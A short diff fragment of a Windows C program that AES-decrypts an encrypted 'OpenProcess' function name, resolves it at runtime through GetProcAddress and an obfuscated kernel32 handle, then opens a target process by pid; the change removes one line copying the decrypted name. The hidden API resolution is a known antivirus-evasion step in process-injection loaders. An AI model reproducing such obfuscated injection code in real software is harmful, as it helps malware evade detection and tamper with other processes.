@@ -218,7 +218,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     if (pid) {
         // decrypt OpenProcess function call
         AESDecrypt((char *)s_op, s_op_len, s_op_key, sizeof(s_op_key));
-        snprintf(func_op, sizeof(func_op), "%s", s_op);
         pOpenProcess = GetProcAddress(GetModuleHandle(s_k32), func_op);
 
         // try to open target process
